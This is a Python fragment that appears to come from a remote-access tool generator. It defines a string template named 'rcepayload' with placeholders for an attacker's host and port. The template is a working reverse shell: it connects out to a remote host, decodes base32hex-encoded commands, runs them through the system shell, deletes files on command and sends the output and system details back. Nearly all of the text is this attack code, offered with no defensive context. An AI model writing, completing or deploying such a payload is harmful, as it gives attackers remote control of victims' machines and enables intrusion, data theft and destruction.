rcepayload='''
import socket
import base64
import subprocess as sp
import os
import platform

def get_systeminfo():
    sysinfo=f"""
 System: {{platform.system()}}
 Nodename: {{platform.node()}}
 Architecture: {{platform.uname().machine}}
 Release: {{platform.release()}}
 Version: {{platform.version()}}"""
    return sysinfo

def custom_help():
    help_text="""
 COMMAND   DESCRIPTION
 
 banner      Shows the tool banner
 sysinfo     Retrieve detailed system and hardware information.
 help        Show usage information and available options."""
    return help_text

def remove(cmd: list):
    sp.run(cmd, capture_output=True, check=True)
    if cmd[1] == '-rf':
        return f"[REMOVED]: {{''.join(cmd[2:])}}"
    return f"[REMOVED]: {{''.join(cmd[1:])}}"

class Payload:
    def __init__(self):
        pass

    def reverseshell(self, host, port):
        self.s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((host, port))
        while True:
            recvdata=self.s.recv(1024)
            decodeddata=base64.b32hexdecode(recvdata).decode()
            if decodeddata in ["quit", "exit"]:
                self.s.send("[INFO]: Remote shell of {{}} is exitted!.".format(os.getlogin()).encode())            
                self.s.close()
                break
            self.shell_helper(decodeddata)

    def shell_helper(self, query):
        cmd = query.split()[0]
        match cmd:
            case 'cd':
                os.chdir(query[3:])
                text="[INFO]: Directory changed: {{}}"
                self.s.send(text.format(os.getcwd()).encode())

            case 'rm':
                self.s.send(remove(query.split()).encode())

            case 'sysinfo':
                self.s.send(get_systeminfo().encode())

            case 'banner':
                self.s.send("\u00A0".encode())
            case 'help':
                self.s.send(custom_help().encode())

            case _:
                try:
                    result=sp.run(
                        query, shell=True, check=True,
                        capture_output=True)

                    if not result.stdout.strip():
                        self.s.send(f"[EXECUTED]: {{query}}".encode())
                    self.s.send(result.stdout.strip()) 
                except sp.CalledProcessError as e:
                    self.s.send(e.stderr.strip())

    def custom_command_helper(self, custom_command):
        match custom_command:
            case '':
                pass

payload = Payload()
payload.reverseshell(\"{}\", {})
'''
